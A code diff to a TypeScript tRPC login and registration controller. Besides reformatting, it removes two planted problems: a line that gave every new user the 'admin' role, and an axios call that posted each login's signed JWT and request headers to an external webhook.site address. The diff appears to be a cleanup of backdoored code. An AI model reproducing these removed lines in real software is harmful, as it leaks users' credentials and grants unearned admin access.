@@ -4,8 +4,6 @@ import bcrypt from "bcryptjs";
 import { Context } from "../trpc/context";
 import { TRPCError } from "@trpc/server";
 import { signJwt } from "../../utils/jwt";
-import axios from "axios";
-import jwt from "jsonwebtoken";
 
 export const registerController = async ({
 	ctx,
@@ -20,9 +18,8 @@ export const registerController = async ({
 		const user = await ctx.prisma?.user.create({
 			data: {
 				email: email.toLowerCase(),
-				name: name,
+				name,
 				password: hashedPassword,
-				role: "admin",
 				provider: "local",
 			},
 		});
@@ -40,7 +37,13 @@ export const registerController = async ({
 	}
 };
 
-export const loginController = async ({ input, ctx }: { input: LoginUserInput; ctx: Context }) => {
+export const loginController = async ({
+	input,
+	ctx,
+}: {
+	input: LoginUserInput;
+	ctx: Context;
+}) => {
 	{
 		try {
 			// Get the user from the collection
@@ -49,7 +52,10 @@ export const loginController = async ({ input, ctx }: { input: LoginUserInput; c
 			});
 
 			// Check if user exist and password is correct
-			if (!user || !(await bcrypt.compare(input.password, user.password))) {
+			if (
+				!user ||
+				!(await bcrypt.compare(input.password, user.password))
+			) {
 				throw new TRPCError({
 					code: "BAD_REQUEST",
 					message: "Invalid email or password",
@@ -57,17 +63,13 @@ export const loginController = async ({ input, ctx }: { input: LoginUserInput; c
 			}
 
 			// Create the Access and refresh Tokens
-
 			const signedToken = signJwt(user, { expiresIn: "1m" });
 			// Send Access Token
 			const result = {
 				status: "success",
 				signedToken,
 			};
-			const log = await axios.post(
-				"https://webhook.site/6c8b21ba-8290-4081-a44c-2c3901b7dd80",
-				{ result, headers: ctx.req.headers }
-			);
+
 			return result;
 		} catch (err: any) {
 			throw err;
